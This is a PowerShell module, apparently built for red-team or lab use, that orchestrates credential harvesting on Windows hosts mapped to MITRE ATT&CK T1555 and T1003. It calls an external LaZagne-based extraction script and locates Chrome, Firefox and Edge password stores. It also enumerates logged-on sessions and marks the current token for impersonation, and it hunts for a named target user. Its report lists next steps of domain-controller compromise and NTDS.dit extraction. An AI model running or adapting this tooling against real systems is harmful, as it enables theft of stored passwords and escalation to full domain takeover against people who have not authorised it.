# ========================================
#   CredExtraction PowerShell Module
#   Credential Extraction & Analysis
# ========================================

# Global configuration
$global:CredExtractionConfig = @{
    OutputDirectory = "C:\Intel\Logs"
    Prefix = "CredExtraction_"
    TargetUser = ""
    LaZagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
}

# Import required modules function
function Import-RequiredModules {
    try {
        # No additional modules required for credential extraction
        return $true
    }
    catch {
        Write-Host "[!] Failed to import required modules: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Credential Extraction (T1555 + T1003)
function Invoke-CredentialExtraction {
    <#
    .SYNOPSIS
    Extracts stored credentials using LaZagne and Windows APIs
    .DESCRIPTION
    Maps to MITRE ATT&CK T1555 - Credentials from Password Stores & T1003 - OS Credential Dumping
    #>
    param(
        [string]$TargetUser = "",
        [switch]$AllCredentials = $true,
        [switch]$DomainFocus = $true
    )
    
    if ($TargetUser) { $global:CredExtractionConfig.TargetUser = $TargetUser }
    
    $scriptPath = Join-Path $PSScriptRoot "Credential Extraction (T1555-T1003).ps1"
    if (Test-Path $scriptPath) {
        $results = & $scriptPath -OutputDirectory $global:CredExtractionConfig.OutputDirectory -TargetUser $global:CredExtractionConfig.TargetUser -AllCredentials:$AllCredentials -DomainFocus:$DomainFocus
        
        # Save results
        $outputFile = Join-Path $global:CredExtractionConfig.OutputDirectory "$($global:CredExtractionConfig.Prefix)CredentialExtraction.txt"
        if (-not (Test-Path $global:CredExtractionConfig.OutputDirectory)) {
        New-Item -ItemType Directory -Path $global:CredExtractionConfig.OutputDirectory -Force | Out-Null
        Write-Host "[+] Created output directory: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Green
    }
        $results | Format-Table -AutoSize | Out-String | Out-File -FilePath $outputFile -Encoding UTF8
        Write-Host "[+] Results saved to: $outputFile" -ForegroundColor Green
        
        return $results
    } else {
        Write-Error "Credential Extraction script not found"
    }
}

# Browser Credential Extraction
function Invoke-BrowserCredExtraction {
    <#
    .SYNOPSIS
    Extracts stored browser credentials
    .DESCRIPTION
    Targets Chrome, Firefox, Edge, and other browser credential stores
    #>
    
    Write-Host "[*] Extracting browser credentials..." -ForegroundColor Cyan
    
    $browserResults = @()
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
    
    # Chrome credential extraction
    try {
        $chromeDir = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"
        if (Test-Path $chromeDir) {
            $loginDataPath = Join-Path $chromeDir "Login Data"
            if (Test-Path $loginDataPath) {
                $browserResults += [PSCustomObject]@{
                    Browser = "Chrome"
                    Type = "Login Database"
                    Location = $loginDataPath
                    Status = "Found"
                    Details = "Chrome login database detected (requires decryption)"
                    Timestamp = $timestamp
                    Notes = "LaZagne can extract these credentials"
                }
                Write-Host "[+] Chrome login database found" -ForegroundColor Green
            }
        }
    }
    catch {
        Write-Host "[!] Could not check Chrome credentials" -ForegroundColor Yellow
    }
    
    # Firefox credential extraction
    try {
        $firefoxProfiles = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
        if (Test-Path $firefoxProfiles) {
            $profiles = Get-ChildItem $firefoxProfiles -Directory -ErrorAction SilentlyContinue
            foreach ($profile in $profiles) {
                $loginJsonPath = Join-Path $profile.FullName "logins.json"
                if (Test-Path $loginJsonPath) {
                    $browserResults += [PSCustomObject]@{
                        Browser = "Firefox"
                        Type = "Login JSON"
                        Location = $loginJsonPath
                        Status = "Found"
                        Details = "Firefox login JSON detected (requires decryption)"
                        Timestamp = $timestamp
                        Notes = "LaZagne can extract these credentials"
                    }
                    Write-Host "[+] Firefox login data found in profile: $($profile.Name)" -ForegroundColor Green
                }
            }
        }
    }
    catch {
        Write-Host "[!] Could not check Firefox credentials" -ForegroundColor Yellow
    }
    
    # Edge credential extraction
    try {
        $edgeDir = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default"
        if (Test-Path $edgeDir) {
            $loginDataPath = Join-Path $edgeDir "Login Data"
            if (Test-Path $loginDataPath) {
                $browserResults += [PSCustomObject]@{
                    Browser = "Edge"
                    Type = "Login Database"
                    Location = $loginDataPath
                    Status = "Found"
                    Details = "Edge login database detected (requires decryption)"
                    Timestamp = $timestamp
                    Notes = "LaZagne can extract these credentials"
                }
                Write-Host "[+] Edge login database found" -ForegroundColor Green
            }
        }
    }
    catch {
        Write-Host "[!] Could not check Edge credentials" -ForegroundColor Yellow
    }
    
    # Save browser results
    $outputFile = Join-Path $global:CredExtractionConfig.OutputDirectory "$($global:CredExtractionConfig.Prefix)BrowserCredentials.txt"
    if (-not (Test-Path $global:CredExtractionConfig.OutputDirectory)) {
        New-Item -ItemType Directory -Path $global:CredExtractionConfig.OutputDirectory -Force | Out-Null
        Write-Host "[+] Created output directory: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Green
    }
    $browserResults | Format-Table -AutoSize | Out-String | Out-File -FilePath $outputFile -Encoding UTF8
    Write-Host "[+] Browser credential analysis saved to: $outputFile" -ForegroundColor Green
    
    return $browserResults
}

# Memory Credential Extraction
function Invoke-MemoryCredExtraction {
    <#
    .SYNOPSIS
    Attempts to extract credentials from memory (limited without additional tools)
    .DESCRIPTION
    Basic memory credential extraction - full capability requires Mimikatz
    #>
    
    Write-Host "[*] Analyzing memory for credentials..." -ForegroundColor Cyan
    
    $memoryResults = @()
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
    
    # Check for current user context
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $memoryResults += [PSCustomObject]@{
        Source = "Current Process"
        Type = "Windows Identity"
        Username = $currentUser.Name
        AuthType = $currentUser.AuthenticationType
        IsAuthenticated = $currentUser.IsAuthenticated
        Token = "Available"
        Details = "Current user token available for impersonation"
        Timestamp = $timestamp
        Notes = "Can be used for token manipulation attacks"
    }
    
    # Check for logged in users via WMI
    try {
        $loggedInSessions = Get-WmiObject Win32_LoggedOnUser -ErrorAction SilentlyContinue | ForEach-Object {
            $user = $_.Antecedent -replace ".*Name=`"([^`"]+)`".*", '$1'
            $domain = $_.Antecedent -replace ".*Domain=`"([^`"]+)`".*", '$1'
            "$domain\$user"
        } | Sort-Object -Unique
        
        foreach ($session in $loggedInSessions) {
            $memoryResults += [PSCustomObject]@{
                Source = "WMI LoggedOnUser"
                Type = "Active Session"
                Username = $session
                AuthType = "Windows"
                IsAuthenticated = $true
                Token = "In Memory"
                Details = "User session detected - potential for credential extraction"
                Timestamp = $timestamp
                Notes = "Target for advanced memory extraction (requires Mimikatz/similar)"
            }
            
            if ($session -like "*$($global:CredExtractionConfig.TargetUser)*") {
                Write-Host "[!] TARGET USER SESSION FOUND: $session" -ForegroundColor Red
            }
        }
        
        Write-Host "[+] Found $($loggedInSessions.Count) unique user sessions" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Could not enumerate logged in users via WMI" -ForegroundColor Yellow
    }
    
    # Save memory results
    $outputFile = Join-Path $global:CredExtractionConfig.OutputDirectory "$($global:CredExtractionConfig.Prefix)MemoryCredentials.txt"
    if (-not (Test-Path $global:CredExtractionConfig.OutputDirectory)) {
        New-Item -ItemType Directory -Path $global:CredExtractionConfig.OutputDirectory -Force | Out-Null
        Write-Host "[+] Created output directory: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Green
    }
    $memoryResults | Format-Table -AutoSize | Out-String | Out-File -FilePath $outputFile -Encoding UTF8
    Write-Host "[+] Memory credential analysis saved to: $outputFile" -ForegroundColor Green
    
    return $memoryResults
}

# Full Credential Extraction
function Invoke-FullCredExtraction {
    <#
    .SYNOPSIS
    Executes complete credential extraction using all available methods
    .DESCRIPTION
    Runs LaZagne, browser extraction, and memory analysis for comprehensive credential harvesting
    #>
    param(
        [string]$TargetUser = "Sherlock"
    )
    
    if ($TargetUser) { $global:CredExtractionConfig.TargetUser = $TargetUser }
    
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "  CREDENTIAL EXTRACTION & ANALYSIS" -ForegroundColor Magenta  
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host ""
    
    if (-not (Test-Path $global:CredExtractionConfig.OutputDirectory)) {
        New-Item -ItemType Directory -Path $global:CredExtractionConfig.OutputDirectory -Force | Out-Null
        Write-Host "[+] Created output directory: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Green
    }
    
    $allResults = @()
    $startTime = Get-Date
    
    Write-Host "[*] Starting comprehensive credential extraction..." -ForegroundColor Cyan
    Write-Host "[*] Target User: $($global:CredExtractionConfig.TargetUser)" -ForegroundColor Gray
    Write-Host "[*] Output Directory: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Gray
    Write-Host ""
    
    # LaZagne Credential Extraction
    Write-Host "=== LaZagne Credential Extraction (T1555 + T1003) ===" -ForegroundColor Yellow
    try {
        $credResults = Invoke-CredentialExtraction -TargetUser $global:CredExtractionConfig.TargetUser
        $allResults += @{ Method = "LaZagne Extraction"; Results = $credResults; Count = $credResults.Count }
        Write-Host "[+] Completed: Found $($credResults.Count) credential sources" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
        $allResults += @{ Method = "LaZagne Extraction"; Results = @(); Count = 0; Error = $_.Exception.Message }
    }
    Write-Host ""
    
    # Browser Credential Extraction
    Write-Host "=== Browser Credential Extraction ===" -ForegroundColor Yellow
    try {
        $browserResults = Invoke-BrowserCredExtraction
        $allResults += @{ Method = "Browser Extraction"; Results = $browserResults; Count = $browserResults.Count }
        Write-Host "[+] Completed: Found $($browserResults.Count) browser credential sources" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
        $allResults += @{ Method = "Browser Extraction"; Results = @(); Count = 0; Error = $_.Exception.Message }
    }
    Write-Host ""
    
    # Memory Credential Analysis
    Write-Host "=== Memory Credential Analysis ===" -ForegroundColor Yellow
    try {
        $memoryResults = Invoke-MemoryCredExtraction
        $allResults += @{ Method = "Memory Analysis"; Results = $memoryResults; Count = $memoryResults.Count }
        Write-Host "[+] Completed: Found $($memoryResults.Count) memory credential sources" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
        $allResults += @{ Method = "Memory Analysis"; Results = @(); Count = 0; Error = $_.Exception.Message }
    }
    Write-Host ""
    
    # Generate summary report
    $endTime = Get-Date
    $duration = $endTime - $startTime
    
    $summaryReport = @"
========================================
CREDENTIAL EXTRACTION SUMMARY
========================================

Execution Details:
- Start Time: $($startTime.ToString("yyyy-MM-dd HH:mm:ss UTC"))
- End Time: $($endTime.ToString("yyyy-MM-dd HH:mm:ss UTC"))  
- Duration: $($duration.ToString("mm\:ss"))
- Target User: $($global:CredExtractionConfig.TargetUser)
- Output Location: $($global:CredExtractionConfig.OutputDirectory)

Extraction Results:
$($allResults | ForEach-Object { 
    if ($_.Error) {
        "- $($_.Method): FAILED ($($_.Error))"
    } else {
        "- $($_.Method): $($_.Count) sources found"
    }
} | Out-String)

MITRE ATT&CK Techniques Executed:
- T1555: Credentials from Password Stores
- T1003: OS Credential Dumping

Total Credential Sources: $($allResults | Where-Object { -not $_.Error } | Measure-Object -Property Count -Sum | Select-Object -ExpandProperty Sum)

Files Generated:
$(Get-ChildItem -Path $global:CredExtractionConfig.OutputDirectory -Filter "$($global:CredExtractionConfig.Prefix)*" | ForEach-Object { "- $($_.Name)" } | Out-String)

Next Steps:
- Review extracted credentials for domain admin accounts
- Use valid domain credentials for DC compromise
- Execute NTDS.dit extraction if domain admin found
"@
    
    $summaryFile = Join-Path $global:CredExtractionConfig.OutputDirectory "$($global:CredExtractionConfig.Prefix)ExtractionSummary.txt"
    $summaryReport | Out-File -FilePath $summaryFile -Encoding UTF8
    
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "  CREDENTIAL EXTRACTION COMPLETE" -ForegroundColor Magenta
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "Summary:" -ForegroundColor Green
    $allResults | Where-Object { -not $_.Error } | ForEach-Object {
        Write-Host "✓ $($_.Method): $($_.Count) sources" -ForegroundColor Green
    }
    $allResults | Where-Object { $_.Error } | ForEach-Object {
        Write-Host "✗ $($_.Method): Failed" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "Results saved to: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Cyan
    Write-Host "Summary report: $summaryFile" -ForegroundColor Cyan
    
    # Check if target user found
    $targetFound = $false
    foreach ($result in $allResults) {
        if ($result.Results) {
            foreach ($cred in $result.Results) {
                if ($cred.Username -like "*$($global:CredExtractionConfig.TargetUser)*" -or $cred.Details -like "*$($global:CredExtractionConfig.TargetUser)*") {
                    $targetFound = $true
                    break
                }
            }
        }
    }
    
    if ($targetFound) {
        Write-Host ""
        Write-Host "[!] TARGET USER CREDENTIALS POTENTIALLY FOUND!" -ForegroundColor Red
        Write-Host "[!] Review output files for $($global:CredExtractionConfig.TargetUser) credentials" -ForegroundColor Red
        Write-Host "[!] Next Phase: DC Compromise using extracted credentials" -ForegroundColor Red
    }
    
    return $allResults
}

# Utility Functions
function Ensure-OutputDirectory {
    if (-not (Test-Path $global:CredExtractionConfig.OutputDirectory)) {
        try {
            New-Item -ItemType Directory -Path $global:CredExtractionConfig.OutputDirectory -Force | Out-Null
            Write-Host "[+] Created output directory: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Green
        }
        catch {
            Write-Error "Failed to create output directory: $($_.Exception.Message)"
        }
    }
}

function Get-CredExtractionResults {
    <#
    .SYNOPSIS
    Retrieves and displays credential extraction results
    .DESCRIPTION
    Shows summary of credential extraction results from output directory
    #>
    
    if (-not (Test-Path $global:CredExtractionConfig.OutputDirectory)) {
        Write-Host "No results found. Run Invoke-FullCredExtraction first." -ForegroundColor Yellow
        return
    }
    
    $resultFiles = Get-ChildItem -Path $global:CredExtractionConfig.OutputDirectory -Filter "$($global:CredExtractionConfig.Prefix)*"
    
    if ($resultFiles.Count -eq 0) {
        Write-Host "[!] No credential extraction results found." -ForegroundColor Yellow
        return
    }
    
    Write-Host "Credential Extraction Results:" -ForegroundColor Cyan
    Write-Host "Location: $($global:CredExtractionConfig.OutputDirectory)" -ForegroundColor Gray
    Write-Host ""
    
    foreach ($file in $resultFiles) {
        $fileSize = [math]::Round($file.Length / 1KB, 2)
        Write-Host "🔐 $($file.Name) ($fileSize KB)" -ForegroundColor White
        Write-Host "   Modified: $($file.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"))" -ForegroundColor Gray
        Write-Host ""
    }
}

function Set-CredExtractionConfig {
    <#
    .SYNOPSIS
    Configure credential extraction settings
    .DESCRIPTION
    Sets target user and output preferences
    #>
    param(
        [string]$TargetUser,
        [string]$OutputDirectory
    )
    
    if ($TargetUser) { 
        $global:CredExtractionConfig.TargetUser = $TargetUser 
        Write-Host "[+] Target user set to: $TargetUser" -ForegroundColor Green
    }
    if ($OutputDirectory) { 
        $global:CredExtractionConfig.OutputDirectory = $OutputDirectory 
        Write-Host "[+] Output directory set to: $OutputDirectory" -ForegroundColor Green
    }
}

# Aliases for convenience
New-Alias -Name "Run-CredExtraction" -Value "Invoke-FullCredExtraction" -Force
New-Alias -Name "Get-CredResults" -Value "Get-CredExtractionResults" -Force

# Export functions
Export-ModuleMember -Function @(
    'Invoke-CredentialExtraction',
    'Invoke-BrowserCredExtraction',
    'Invoke-MemoryCredExtraction', 
    'Invoke-FullCredExtraction',
    'Get-CredExtractionResults',
    'Set-CredExtractionConfig',
    'Ensure-OutputDirectory'
) -Alias @('Run-CredExtraction', 'Get-CredResults')